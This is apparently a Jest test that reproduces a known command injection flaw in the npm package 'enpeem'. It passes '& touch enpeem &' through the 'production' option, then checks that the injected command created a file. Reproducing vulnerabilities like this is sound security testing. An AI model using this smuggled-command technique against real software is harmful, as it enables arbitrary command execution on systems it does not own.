//https://snyk.io/vuln/SNYK-JS-ENPEEM-559007
test("Command Injection in enpeem", () => {
  const root = require("enpeem");
  const fs = require("fs");
  const path = "./enpeem";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let attack_code = "& touch enpeem &";
  let opts = {
    production: attack_code,
  };

  root.update(opts, function () {
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
